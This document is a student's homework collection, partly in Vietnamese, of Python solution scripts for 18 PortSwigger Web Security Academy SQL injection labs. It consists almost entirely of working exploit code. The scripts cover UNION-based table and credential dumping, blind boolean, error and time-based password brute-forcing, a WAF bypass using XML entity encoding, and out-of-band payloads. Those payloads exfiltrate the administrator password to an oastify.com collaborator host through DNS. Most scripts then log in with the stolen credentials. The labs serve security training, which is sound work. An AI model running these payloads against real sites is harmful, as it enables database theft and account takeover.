# TASK 3 WEB

# I. Code python for 18 labs

1. Lab 1

```python
import requests
url = "https://0ab900700477966480573563005b0016.web-security-academy.net"
target_url = f"{url}/filter?category=Gifts'+OR+1=1+--"
response = requests.get(target_url)
if (response.status_code == 200):
    print("Successful")
else:
    print("Failed")
```

1. Lab 2

```python
import requests
from bs4 import BeautifulSoup

url = "https://0a3a00a703264d9b807a99d100e600cc.web-security-academy.net"
login_url = f"{url}/login" # Endpoint login
target_url = f"{url}/login"  # URL để gửi yêu cầu đăng nhập

# Bước 1: Lấy trang login để trích xuất CSRF token
session = requests.Session()
response = session.get(login_url)
soup = BeautifulSoup(response.text, 'html.parser')
csrf_token = soup.find('input', {'name': 'csrf'})['value']  # Giả sử token nằm trong input name='csrf'

# Bước 2: Chuẩn bị payload với CSRF token
payload = {
    "username": "administrator' OR 1=1 --",  # Payload SQL injection
    "password": "anything",
    "csrf": csrf_token  # Thêm CSRF token
}

# Bước 3: Gửi yêu cầu POST
response = session.post(target_url, data=payload)
if (response.status_code == 200):
    print("Successful")
else:
    print("Failed")
```

1. Lab 3

```python
import requests
url = "https://0ad300870461ddbe80ef266900150089.web-security-academy.net"

i = 1
while True:
    order_url = f"{url}/filter?category=Accessories'+ORDER+BY+{i}+--"
    response = requests.get(order_url)

    if response.status_code == 200:
        i += 1
    else:
        i -= 1
        break
        

if i == 0:
    union_url = f"{url}/filter?category=Pets'+UNION+SELECT+banner+FROM+v$version+--"
else:
    null_values = ", ".join(["NULL"] * (i - 1))
    union_url = f"{url}/filter?category=Pets'+UNION+SELECT+banner,+{null_values}+FROM+v$version+--"

print(f"Payload: {union_url}")
response = requests.get(union_url)

if (response.status_code == 200):
    print("Successful")
else:
    print("Failed")
```

1. Lab 4

```python
import requests
url = "https://0a42007504b90aab8043083b00c300e1.web-security-academy.net"

i = 1
while True:
    order_url = f"{url}/filter?category=Pets'+ORDER+BY+{i}+--+ "
    response = requests.get(order_url)
    if response.status_code == 200:
        i += 1
    else:
        i -= 1
        break
        

if i == 0:
    union_url = f"{url}/filter?category=Pets'+UNION+SELECT+@@version+--+ "
else:
    null_values = ", ".join(["NULL"] * (i - 1))
    union_url = f"{url}/filter?category=Pets'+UNION+SELECT+@@version,+{null_values}+--+ "

print(f"Payload: {union_url}")
response = requests.get(union_url)
if (response.status_code == 200):
    print("Successful")
else:
    print("Failed")
```

1. Lab 5

```python
import requests
from bs4 import BeautifulSoup
url = "https://0af900360319c004804f8a3c001300e4.web-security-academy.net"

#Step 1: check the number of the column
i = 1
while True:
    order_url = f"{url}/filter?category=Pets' ORDER BY {i}--"
    response = requests.get(order_url)

    if response.status_code == 200:
        i += 1  
    else:
        i -= 1  
        break
print(f"Payload: {order_url}")
print("Co", i, "cot")

#Step 2: check the column that have string type
test_string = "'abc'" 
num_columns = i  
found_column = None
for j in range(1, num_columns + 1):
    null_values = ", ".join(["NULL"] * (num_columns - 1))
    if j == 1:
        union_url = f"{url}/filter?category=Pets' UNION SELECT {test_string}, {null_values}--"
    elif j == num_columns:
        union_url = f"{url}/filter?category=Pets' UNION SELECT {null_values}, {test_string}--"
    else:
        left_nulls = ", ".join(["NULL"] * (j - 1))
        right_nulls = ", ".join(["NULL"] * (num_columns - j))
        union_url = f"{url}/filter?category=Pets' UNION SELECT {left_nulls}, {test_string}, {right_nulls}--"
    print(f"Payload: {union_url}")
    response = requests.get(union_url)
    if response.status_code == 200:
        found_column = j
        print(f"Cot {found_column} in ra string.")
        break

#step 3: check the tables
payload_columns = ["NULL"] * num_columns
payload_columns[found_column - 1] = "table_name"
union_url = f"{url}/filter?category=Pets' UNION SELECT {','.join(payload_columns)} FROM information_schema.tables--"
print("Payload:",union_url)
response = requests.get(union_url)
if response.status_code == 200:
    soup = BeautifulSoup(response.text, "html.parser")
    for row in soup.find_all("tr"):
        th = row.find("th")
        if th and th.text.strip().startswith("users_"):
            random = th.text.strip().split("_", 1)[1]
            print("Table name:", random)
            break

#Step 4: check the columns
payload_columns[found_column - 1] = "column_name"
union_url = f"{url}/filter?category=Pets' UNION SELECT {', '.join(payload_columns)} FROM information_schema.columns WHERE table_name='users_{random}'--"
print("Payload:",union_url)
response = requests.get(union_url)
if response.status_code == 200:
    print("done")
    soup = BeautifulSoup(response.text, "html.parser")
    random1, random2 = None, None
    for row in soup.find_all("tr"):
        th = row.find("th")
        if th:
            content = th.text.strip()
            if content.startswith("username_") and random1 is None: random1 = content.split("_", 1)[1]
            elif content.startswith("password_") and random2 is None: random2 = content.split("_", 1)[1]
            if random1 and random2: 
                print("Cot username:",random1)
                print("Cot password:",random2)
                break
                

#Step 5: check the password
payload_columns[found_column - 1] = f"username_{random1}||':'||password_{random2}"
union_url = f"{url}/filter?category=Pets' UNION SELECT {','.join(payload_columns)} FROM users_{random}+--"
print("Payload:",union_url)
response = requests.get(union_url)
if response.status_code == 200:
    soup = BeautifulSoup(response.text, "html.parser")
    for row in soup.find_all("tr"):
        th = row.find("th")
        if th and th.text.strip().startswith("administrator"):
            password_found = th.text.strip().split(":", 1)[1]
            print("Password tim duoc:",password_found)
            break

#Step 6: login              
login_url = f"{url}/login"
session = requests.Session()
response = session.get(login_url)
soup = BeautifulSoup(response.text, "html.parser")
csrf_token = soup.find("input", {"name": "csrf"})["value"]
data = {"csrf": csrf_token, "username": "administrator", "password": password_found}
response = session.post(login_url, data=data)
print("Đăng nhập thành công!" if "Welcome" in response.text or response.status_code == 200 else "Đăng nhập thất bại.")
exit()
```

1. Lab 6

```python
import requests
from bs4 import BeautifulSoup
url = "https://0a63008103e842b780ba081e00880088.web-security-academy.net"

#Step 1: check the number of the column
i = 1
while True:
    order_url = f"{url}/filter?category=Pets' ORDER BY {i}--"
    response = requests.get(order_url)

    if response.status_code == 200:
        i += 1  
    else:
        i -= 1  
        break
print(f"Payload: {order_url}")
print("Co", i, "cot")

#Step 2: check the column that have string type
test_string = "'abc'" 
num_columns = i  
found_column = None
for j in range(1, num_columns + 1):
    null_values = ", ".join(["NULL"] * (num_columns - 1))
    if j == 1:
        union_url = f"{url}/filter?category=Pets' UNION SELECT {test_string}, {null_values} FROM dual --"
    elif j == num_columns:
        union_url = f"{url}/filter?category=Pets' UNION SELECT {null_values}, {test_string} FROM dual --"
    else:
        left_nulls = ", ".join(["NULL"] * (j - 1))
        right_nulls = ", ".join(["NULL"] * (num_columns - j))
        union_url = f"{url}/filter?category=Pets' UNION SELECT {left_nulls}, {test_string}, {right_nulls} FROM dual --"
    print(f"Payload: {union_url}")
    response = requests.get(union_url)
    if response.status_code == 200:
        found_column = j
        print(f"Cot {found_column} in ra string.")
        break

#step 3: check the tables
payload_columns = ["NULL"] * num_columns
payload_columns[found_column - 1] = "table_name"
union_url = f"{url}/filter?category=Pets' UNION SELECT {','.join(payload_columns)} FROM all_tab_columns--"
print("Payload:",union_url)
response = requests.get(union_url)
if response.status_code == 200:
    soup = BeautifulSoup(response.text, "html.parser")
    for row in soup.find_all("tr"):
        th = row.find("th")
        if th and th.text.strip().startswith("USERS_"):
            random = th.text.strip().split("_", 1)[1]
            print("Table name:", random)
            break

#Step 4: check the columns
payload_columns[found_column - 1] = "column_name"
union_url = f"{url}/filter?category=Pets' UNION SELECT {','.join(payload_columns)} FROM all_tab_columns WHERE table_name='USERS_{random}'--"
print("Payload:",union_url)
response = requests.get(union_url)
if response.status_code == 200:
    soup = BeautifulSoup(response.text, "html.parser")
    random1, random2 = None, None
    for row in soup.find_all("tr"):
        th = row.find("th")
        if th:
            content = th.text.strip()
            if content.startswith("USERNAME_") and random1 is None: random1 = content.split("_", 1)[1]
            elif content.startswith("PASSWORD_") and random2 is None: random2 = content.split("_", 1)[1]
            if random1 and random2: 
                print("Cot username:",random1)
                print("Cot password:",random2)
                break
                

#Step 5: check the password
payload_columns[found_column - 1] = f"USERNAME_{random1}||':'||PASSWORD_{random2}"
union_url = f"{url}/filter?category=Pets' UNION SELECT {','.join(payload_columns)} FROM USERS_{random}+--"
print("Payload:",union_url)
response = requests.get(union_url)
if response.status_code == 200:
    soup = BeautifulSoup(response.text, "html.parser")
    for row in soup.find_all("tr"):
        th = row.find("th")
        if th and th.text.strip().startswith("administrator"):
            password_found = th.text.strip().split(":", 1)[1]
            print("Password tim duoc:",password_found)
            break

#Step 6: login              
login_url = f"{url}/login"
session = requests.Session()
response = session.get(login_url)
soup = BeautifulSoup(response.text, "html.parser")
csrf_token = soup.find("input", {"name": "csrf"})["value"]
data = {"csrf": csrf_token, "username": "administrator", "password": password_found}
response = session.post(login_url, data=data)
print("Đăng nhập thành công!" if "Welcome" in response.text or response.status_code == 200 else "Đăng nhập thất bại.")
exit()
```

1. Lab 7

```python
import requests

url="https://0a0a00a30477f0b680efc66300dc00fe.web-security-academy.net"

#Step 1: check the number of the column
i = 1
while True:
    order_url = f"{url}/filter?category=Gifts' ORDER BY {i}--"
    response = requests.get(order_url)

    if response.status_code == 200:
        i += 1  
    else:
        i -= 1  
        break

#Step 2: select "NULL" from all columns
null_values = ", ".join(["NULL"] * i)
union_url = f"{url}/filter?category=Gifts' UNION SELECT {null_values}--"
print(f"Payload: {union_url}")
response = requests.get(union_url)

if (response.status_code == 200):
    print("Successful")
else:
    print("Failed")
```

1. Lab 8

```python
import requests
url="https://0ab500c2047468c98051d05f004c001f.web-security-academy.net"

#Step 1: check the number of the column
i = 1
while True:
    order_url = f"{url}/filter?category=Gifts' ORDER BY {i}--"
    response = requests.get(order_url)
    if response.status_code == 200:
        i += 1  
    else:
        i -= 1  
        break
print(f"Payload: {order_url}")
print("Co", i, "cot")

#Step 2: check the column that have string type
test_string = "'GiJPDC'" 
num_columns = i  
found_column = None

for j in range(1, num_columns + 1):
    # Tạo payload với NULL cho các cột khác, chỉ đặt string ở cột j
    null_values = ", ".join(["NULL"] * (num_columns - 1))
    if j == 1:
        union_url = f"{url}/filter?category=Gifts' UNION SELECT {test_string}, {null_values}--"
    elif j == num_columns:
        union_url = f"{url}/filter?category=Gifts' UNION SELECT {null_values}, {test_string}--"
    else:
        left_nulls = ", ".join(["NULL"] * (j - 1))
        right_nulls = ", ".join(["NULL"] * (num_columns - j))
        union_url = f"{url}/filter?category=Gifts' UNION SELECT {left_nulls}, {test_string}, {right_nulls}--"
    print(f"Payload: {union_url}")
    response = requests.get(union_url)
    if response.status_code == 200:
        found_column = j
        break

if found_column:
    print(f"Successful - Cột {found_column} in ra string.")
else:
    print("Failed - Không tìm thấy cột nào in ra string.")
```

1. Lab 9

```python
import requests
from bs4 import BeautifulSoup

url = "https://0a98006e042284858150390b00b60043.web-security-academy.net"

#Step 1: check the number of the column
i = 1
while True:
    order_url = f"{url}/filter?category=Pets' ORDER BY {i}--"
    response = requests.get(order_url)

    if response.status_code == 200:
        i += 1  
    else:
        i -= 1  
        break
print(f"Payload: {order_url}")
print("Co", i, "cot")

#Step 2: check the column that have string type
test_string = "'abc'" 
num_columns = i  
found_column = None

for j in range(1, num_columns + 1):
    null_values = ", ".join(["NULL"] * (num_columns - 1))
    if j == 1:
        union_url = f"{url}/filter?category=Pets' UNION SELECT {test_string}, {null_values}--"
    elif j == num_columns:
        union_url = f"{url}/filter?category=Pets' UNION SELECT {null_values}, {test_string}--"
    else:
        left_nulls = ", ".join(["NULL"] * (j - 1))
        right_nulls = ", ".join(["NULL"] * (num_columns - j))
        union_url = f"{url}/filter?category=Pets' UNION SELECT {left_nulls}, {test_string}, {right_nulls}--"
    print(f"Payload: {union_url}")
    response = requests.get(union_url)
    if response.status_code == 200:
        found_column = j
        print(f"Cot {found_column} in ra string.")
        break

#step 3: check the tables
payload_columns = ["NULL"] * num_columns
payload_columns[found_column - 1] = "table_name"
union_url = f"{url}/filter?category=Pets' UNION SELECT {','.join(payload_columns)} FROM information_schema.tables--"
print("Payload:",union_url)
response = requests.get(union_url)
if response.status_code == 200:
    soup = BeautifulSoup(response.text, "html.parser")
    for row in soup.find_all("tr"):
        th = row.find("th")
        if th and th.text.strip().startswith("users"):
            print("Co bang users")
            break

#Step 4: check the columns
payload_columns[found_column - 1] = "column_name"
union_url = f"{url}/filter?category=Pets' UNION SELECT {', '.join(payload_columns)} FROM information_schema.columns WHERE table_name='users'--"
print("Payload:",union_url)
response = requests.get(union_url)
if response.status_code == 200:
    print("done")
    soup = BeautifulSoup(response.text, "html.parser")
    for row in soup.find_all("tr"):
        th = row.find("th")
        if th:
            content = th.text.strip()
            if content.startswith("username"): print("Cot username ton tai")
            elif content.startswith("password"): print("Cot password ton tai")
                

#Step 5: check the password
payload_columns[found_column - 1] = f"username||':'||password"
union_url = f"{url}/filter?category=Pets' UNION SELECT {','.join(payload_columns)} FROM users--"
print("Payload:",union_url)
response = requests.get(union_url)
if response.status_code == 200:
    soup = BeautifulSoup(response.text, "html.parser")
    for row in soup.find_all("tr"):
        th = row.find("th")
        if th and th.text.strip().startswith("administrator"):
            password_found = th.text.strip().split(":", 1)[1]
            print("Password tim duoc:",password_found)
            break

#Step 6: login              
login_url = f"{url}/login"
session = requests.Session()
response = session.get(login_url)
soup = BeautifulSoup(response.text, "html.parser")
csrf_token = soup.find("input", {"name": "csrf"})["value"]
data = {"csrf": csrf_token, "username": "administrator", "password": password_found}
response = session.post(login_url, data=data)
print("Đăng nhập thành công!" if "Welcome" in response.text or response.status_code == 200 else "Đăng nhập thất bại.")
exit()
```

1. Lab 10

```python
import requests
from bs4 import BeautifulSoup

url = "https://0aef003d04a118a18067178a0004009d.web-security-academy.net"

#Step 1: check the number of the column
i = 1
while True:
    order_url = f"{url}/filter?category=Pets' ORDER BY {i}--"
    response = requests.get(order_url)

    if response.status_code == 200:
        i += 1  
    else:
        i -= 1  
        break
print(f"Payload: {order_url}")
print("Co", i, "cot")

#Step 2: check the column that have string type
test_string = "'abc'" 
num_columns = i  
found_column = None

for j in range(1, num_columns + 1):
    null_values = ", ".join(["NULL"] * (num_columns - 1))
    if j == 1:
        union_url = f"{url}/filter?category=Pets' UNION SELECT {test_string}, {null_values}--"
    elif j == num_columns:
        union_url = f"{url}/filter?category=Pets' UNION SELECT {null_values}, {test_string}--"
    else:
        left_nulls = ", ".join(["NULL"] * (j - 1))
        right_nulls = ", ".join(["NULL"] * (num_columns - j))
        union_url = f"{url}/filter?category=Pets' UNION SELECT {left_nulls}, {test_string}, {right_nulls}--"

    print(f"Payload: {union_url}")
    response = requests.get(union_url)

    if response.status_code == 200:
        found_column = j
        print(f"Cot {found_column} in ra string.")
        break

#step 3: check the tables
payload_columns = ["NULL"] * num_columns
payload_columns[found_column - 1] = "table_name"
union_url = f"{url}/filter?category=Pets' UNION SELECT {','.join(payload_columns)} FROM information_schema.tables--"
print("Payload:",union_url)
response = requests.get(union_url)
if response.status_code == 200:
    soup = BeautifulSoup(response.text, "html.parser")
    for row in soup.find_all("tr"):
        th = row.find("th")
        if th and th.text.strip().startswith("users"):
            print("Co bang users")
            break

#Step 4: check the columns
payload_columns[found_column - 1] = "column_name"
union_url = f"{url}/filter?category=Pets' UNION SELECT {', '.join(payload_columns)} FROM information_schema.columns WHERE table_name='users'--"
print("Payload:",union_url)
response = requests.get(union_url)
if response.status_code == 200:
    print("done")
    soup = BeautifulSoup(response.text, "html.parser")
    for row in soup.find_all("tr"):
        th = row.find("th")
        if th:
            content = th.text.strip()
            if content.startswith("username"): print("Cot username ton tai")
            elif content.startswith("password"): print("Cot password ton tai")
                

#Step 5: check the password
payload_columns[found_column - 1] = f"username||':'||password"
union_url = f"{url}/filter?category=Pets' UNION SELECT {','.join(payload_columns)} FROM users--"
print("Payload:",union_url)
response = requests.get(union_url)
if response.status_code == 200:
    soup = BeautifulSoup(response.text, "html.parser")
    for row in soup.find_all("tr"):
        th = row.find("th")
        if th and th.text.strip().startswith("administrator"):
            password_found = th.text.strip().split(":", 1)[1]
            print("Password tim duoc:",password_found)
            break

#Step 6: login              
login_url = f"{url}/login"
session = requests.Session()
response = session.get(login_url)
soup = BeautifulSoup(response.text, "html.parser")
csrf_token = soup.find("input", {"name": "csrf"})["value"]
data = {"csrf": csrf_token, "username": "administrator", "password": password_found}
response = session.post(login_url, data=data)
print("Đăng nhập thành công!" if "Welcome" in response.text or response.status_code == 200 else "Đăng nhập thất bại.")
exit()
```

1. Lab 11

```python
import requests
from bs4 import BeautifulSoup

url = "https://0a2c00b803bca18982461f4e001d007b.web-security-academy.net"
response = requests.get(url)

tracking_id = None
if 'Set-Cookie' in response.headers:
    cookies_header = response.headers['Set-Cookie']
    cookie_parts = cookies_header.split(';')
    for part in cookie_parts:
        if part.strip().startswith('TrackingId='):
            tracking_id = part.strip().split('=')[1]
            break
print(f"TrackingId: {tracking_id}")

# Hàm kiểm tra điều kiện đúng hay sai
def check_payload(payload):
    cookies = {
        "TrackingId": payload,
        "session": "abcde"
    }
    response = requests.get(url, cookies=cookies)
    return "Welcome" in response.text

# Bước 1: Xác nhận bảng users tồn tại
payload = f"{tracking_id}' AND (SELECT 'a' FROM users LIMIT 1)='a"
if check_payload(payload):
    print("Bảng users tồn tại")
else:
    print("Không tìm thấy bảng users")
    exit()

# Bước 2: Xác nhận user administrator tồn tại
payload = f"{tracking_id}' AND (SELECT 'a' FROM users WHERE username='administrator')='a"
if check_payload(payload):
    print("User administrator tồn tại")
else:
    print("Không tìm thấy user administrator")
    exit()

# Bước 3: Tìm độ dài mật khẩu
max_len = 30 
password_length = 0
for length in range(1, max_len+1):
    payload = f"{tracking_id}' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>={length})='a"
    if check_payload(payload):
        password_length = length
    else:
        break
print(f"Độ dài mật khẩu: {password_length}")

# Bước 4: Brute-force từng ký tự
charset = 'abcdefghijklmnopqrstuvwxyz.0123456789_ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()}{ ,'
passw = ''
for index in range(1, password_length + 1):
    found = False
    for c in charset:
        payload = f"{tracking_id}' AND (SELECT SUBSTRING(password,{index},1) FROM users WHERE username='administrator')='{c}"
        if check_payload(payload):
            passw += c
            found = True
            print(f"\nĐã tìm được: {passw}")
            break
    if not found:
        print("\nKhông tìm thấy ký tự tiếp theo")
        break

# Bước 5: Đăng nhập
login_url = f"{url}/login"
session = requests.Session()
response = session.get(login_url)
if response.status_code != 200:
    print(f"Không thể truy cập {login_url}, mã lỗi: {response.status_code}")
    exit()
soup = BeautifulSoup(response.text, "html.parser")
csrf_token = soup.find("input", {"name": "csrf"})["value"]
data = {
    "csrf": csrf_token,
    "username": "administrator",
    "password": passw
}
response = session.post(login_url, data=data)
print(f"Request sent to: {login_url}")
if (response.status_code == 200):
    print("Login successful!")
else:
    print("Đăng nhập thất bại.")

```

1. Lab 12

```python
import requests
from bs4 import BeautifulSoup
url = "https://0a1d00ba03d9510b80f208e100cc0032.web-security-academy.net"

response = requests.get(url)

tracking_id = None
if 'Set-Cookie' in response.headers:
    cookies_header = response.headers['Set-Cookie']
    cookie_parts = cookies_header.split(';')
    for part in cookie_parts:
        if part.strip().startswith('TrackingId='):
            tracking_id = part.strip().split('=')[1]
            break
print(f"TrackingId: {tracking_id}")

# Hàm kiểm tra điều kiện đúng hay sai
def check_payload(payload):
    cookies = {
        "TrackingId": payload,
        "session": "abcde"
    }
    response = requests.get(url, cookies=cookies)
    print(response.status_code)
    return response.status_code == 200

# Bước 1: Xác nhận bảng users tồn tại
payload = f"{tracking_id}'||(SELECT '' FROM users WHERE ROWNUM = 1)||'"
if check_payload(payload):
    print("Bảng users tồn tại")
else:
    print("Không tìm thấy bảng users")
    exit()

# Bước 2: Xác nhận user administrator tồn tại
payload = f"{tracking_id}'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrators')||'"
if check_payload(payload):
    print("User administrator tồn tại")
else:
    print("Không tìm thấy user administrator")
    exit()

# Bước 3: Tìm độ dài mật khẩu
max_len = 30 
password_length = 0
for length in range(1, max_len+1):
    payload = f"{tracking_id}'||(SELECT CASE WHEN LENGTH(password)>={length} THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
    if check_payload(payload):
        break
    else:
        password_length = length
print(f"Độ dài mật khẩu: {password_length}")

# Bước 4: Brute-force từng ký tự
charset = 'abcdefghijklmnopqrstuvwxyz.0123456789_ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()}{ ,'
passw = ''
for index in range(1, password_length + 1):
    found = False
    for c in charset:
        payload = f"{tracking_id}'||(SELECT CASE WHEN SUBSTR(password,{index},1)='{c}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
        if not check_payload(payload):
            passw += c
            found = True
            print(f"\nĐã tìm được: {passw}")
            break
    if not found:
        print("\nKhông tìm thấy ký tự tiếp theo")
        break

# Bước 5: Đăng nhập
login_url = f"{url}/login"
session = requests.Session()
response = session.get(login_url)
if response.status_code != 200:
    print(f"Không thể truy cập {login_url}, mã lỗi: {response.status_code}")
    exit()
soup = BeautifulSoup(response.text, "html.parser")
csrf_token = soup.find("input", {"name": "csrf"})["value"]
data = {
    "csrf": csrf_token,
    "username": "administrator",
    "password": passw
}
response = session.post(login_url, data=data)
print(f"Request sent to: {login_url}")
if (response.status_code == 200):
    print("Login successful!")
else:
    print("Đăng nhập thất bại.")
```

1. Lab 13

```python
import requests
import re
from bs4 import BeautifulSoup
url = "https://0abd00e50332102581f461da00a2008a.web-security-academy.net"

# Bước 1: Kiểm tra xem username 'administrator' có tồn tại không
payload_check_admin = f"' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--"
cookies = {
    "TrackingId": payload_check_admin,
    "session": "abc" 
}
print("Payload:", cookies)
response = requests.get(url, cookies=cookies)
# Tìm username trong phản hồi
match = re.search(r'integer: "(\w+)"', response.text)
print(match)
if match and match.group(1) == "administrator":
    print("User administrator tồn tại")
else:
    print("Không tìm thấy user administrator")
    exit()

# Bước 2: Lấy mật khẩu của administrator
payload_get_password = f"' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--"
cookies["TrackingId"] = payload_get_password
response = requests.get(url, cookies=cookies)
match = re.search(r'integer: "(.{20})"', response.text)
if match:
    password = match.group(1)
    print(f"Password administrator: {password}")
else:
    print("Không tìm thấy password của administrator.")

# Bước 3: Đăng nhập
login_url = f"{url}/login"
session = requests.Session()
response = session.get(login_url)
if response.status_code != 200:
    print(f"Không thể truy cập {login_url}, mã lỗi: {response.status_code}")
    exit()
soup = BeautifulSoup(response.text, "html.parser")
csrf_token = soup.find("input", {"name": "csrf"})["value"]
data = {
    "csrf": csrf_token,
    "username": "administrator",
    "password": password
}
response = session.post(login_url, data=data)
print(f"Request sent to: {login_url}")
if (response.status_code == 200):
    print("Login successful!")
else:
    print("Đăng nhập thất bại.")
```

1. Lab 14

```python
import requests
url="https://0ad50037038a38088015677c005e0060.web-security-academy.net"
response = requests.get(url)

tracking_id = None
if 'Set-Cookie' in response.headers:
    cookies_header = response.headers['Set-Cookie']
    cookie_parts = cookies_header.split(';')
    for part in cookie_parts:
        if part.strip().startswith('TrackingId='):
            tracking_id = part.strip().split('=')[1]
            break
print(f"TrackingId: {tracking_id}")

payload = f"{tracking_id}'|| pg_sleep(10)--"
cookies = {
    "TrackingId": payload,
    "session": "70ipyj4mj7XlFojaO9xMj1cbpoiewWAu" 
}
print("Đợi...")
response2 = requests.get(url, cookies=cookies)
print("Xong")
```

1. Lab 15

```python
import requests
import time
from bs4 import BeautifulSoup

url = "https://0aba003f031c103f816b66430057006c.web-security-academy.net"
response = requests.get(url)

tracking_id = None
if 'Set-Cookie' in response.headers:
    cookies_header = response.headers['Set-Cookie']
    cookie_parts = cookies_header.split(';')
    for part in cookie_parts:
        if part.strip().startswith('TrackingId='):
            tracking_id = part.strip().split('=')[1]
            break
print(f"TrackingId: {tracking_id}")

# Hàm kiểm tra điều kiện đúng hay sai
def check_payload(payload):
    cookies = {
        "TrackingId": payload,
        #"session": "abcde"
    }
    start_time = time.time()
    response = requests.get(url, cookies=cookies)
    end_time = time.time()
    response_time = end_time - start_time
    return response_time > 5

# Bước 1: Xác nhận user administrator tồn tại
payload = f"{tracking_id}' || (SELECT CASE WHEN(username='administrator') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users)--"
if check_payload(payload):
    print("User administrator tồn tại")
else:
    print("Không tìm thấy user administrator")
    exit()

# Bước 2: Tìm độ dài mật khẩu
max_len = 30 
password_length = 0
for length in range(19, max_len+1):
    payload = f"{tracking_id}' || (SELECT CASE WHEN (username='administrator' AND LENGTH(password)>={length}) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users)-- "
    if check_payload(payload):
        password_length = length
    else:
        break
print(f"Độ dài mật khẩu: {password_length}")

# Bước 4: Brute-force từng ký tự
charset = 'abcdefghijklmnopqrstuvwxyz.0123456789_ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()}{ ,'
passw = ''
for index in range(1, password_length + 1):
    found = False
    for c in charset:
        payload = f"{tracking_id}' || (SELECT CASE WHEN (username = 'administrator' AND SUBSTRING(password,{index},1) = '{c}') THEN pg_sleep(5) ELSE '' END FROM users)--"
        if check_payload(payload):
            passw += c
            found = True
            print(f"\nĐã tìm được: {passw}")
            break
    if not found:
        print("\nKhông tìm thấy ký tự tiếp theo")
        break

# Bước 5: Đăng nhập
login_url = f"{url}/login"
session = requests.Session()
response = session.get(login_url)
if response.status_code != 200:
    print(f"Không thể truy cập {login_url}, mã lỗi: {response.status_code}")
    exit()
soup = BeautifulSoup(response.text, "html.parser")
csrf_token = soup.find("input", {"name": "csrf"})["value"]
data = {
    "csrf": csrf_token,
    "username": "administrator",
    "password": passw
}
response = session.post(login_url, data=data)
print(f"Request sent to: {login_url}")
if (response.status_code == 200):
    print("Login successful!")
else:
    print("Đăng nhập thất bại.")
```

1. Lab 16

```python
import requests
url = "https://0a7f00d003719d88809a08d300770059.web-security-academy.net"
collaborator_subdomain = "r809w0pri0iakroa1cjbv5v7eykp8fw4.oastify.com" 

payload = f"'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d\"1.0\"+encoding%3d\"UTF-8\"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+\"http%3a//{collaborator_subdomain}/\">+%25remote%3b]>'),'/l')+FROM+dual--"

cookies = {
    "TrackingId": payload,
    "session": "abc"
}
try:
    response = requests.get(url, cookies=cookies)
    print("Payload sent successfully!")
    print("Check Burp Collaborator client for DNS lookup interactions.")
except requests.RequestException as e:
    print(f"Error sending request: {e}")

```

1. Lab 17

```python
import requests
url = "https://0aca00f50359cd2780890dae006f0094.web-security-academy.net"
collaborator_subdomain = "r809w0pri0iakroa1cjbv5v7eykp8fw4.oastify.com" 

payload = f"'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d\"1.0\"+encoding%3d\"UTF-8\"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+\"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.{collaborator_subdomain}/\">+%25remote%3b]>'),'/l')+FROM+dual--"

cookies = {
    "TrackingId": payload,
    "session": "abc"
}
try:
    response = requests.get(url, cookies=cookies)
    print("Payload sent successfully!")
    print("Check Burp Collaborator client for DNS lookup interactions.")
except requests.RequestException as e:
    print(f"Error sending request: {e}")

```

1. Lab 18

```python
import requests
import re
from bs4 import BeautifulSoup
import xml.sax.saxutils as saxutils

base_url = "https://0aee0089046afc83969e09cd00d10076.web-security-academy.net"
stock_url = f"{base_url}/product/stock"
login_url = f"{base_url}/login"

# Hàm mã hóa hex để vượt qua WAF
def hex_encode(payload):
    return ''.join([f'&#x{ord(c):x};' for c in payload])

# Payload SQL injection để lấy username và password
sql_payload = "1 UNION SELECT username || '~' || password FROM users"
encoded_payload = hex_encode(sql_payload)

# Tạo dữ liệu XML cho yêu cầu POST
xml_data = f"""<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>1</productId>
    <storeId>{encoded_payload}</storeId>
</stockCheck>"""

# Gửi yêu cầu POST để lấy thông tin đăng nhập
session = requests.Session()
headers = {"Content-Type": "application/xml"}
try:
    response = session.post(stock_url, data=xml_data, headers=headers)
    if response.status_code == 200:
        # Tìm chuỗi username~password trong phản hồi
        match = re.search(r"(\w+)~(.{20})", response.text)
        if match:
            username, password = match.groups()
            print(f"Found credentials: username={username}, password={password}")
        else:
            print("Could not find credentials in response.")
            exit()
    else:
        print(f"Stock check failed with status code: {response.status_code}")
        exit()
except requests.RequestException as e:
    print(f"Error sending stock check request: {e}")
    exit()

#Login
session = requests.Session()
response = session.get(login_url)
if response.status_code != 200:
    print(f"Không thể truy cập {login_url}, mã lỗi: {response.status_code}")
    exit()
soup = BeautifulSoup(response.text, "html.parser")
csrf_token = soup.find("input", {"name": "csrf"})["value"]
data = {
    "csrf": csrf_token,
    "username": "administrator",
    "password": password
}
response = session.post(login_url, data=data)
print(f"Request sent to: {login_url}")
if (response.status_code == 200):
    print("Login successful!")
else:
    print("Đăng nhập thất bại.")
```
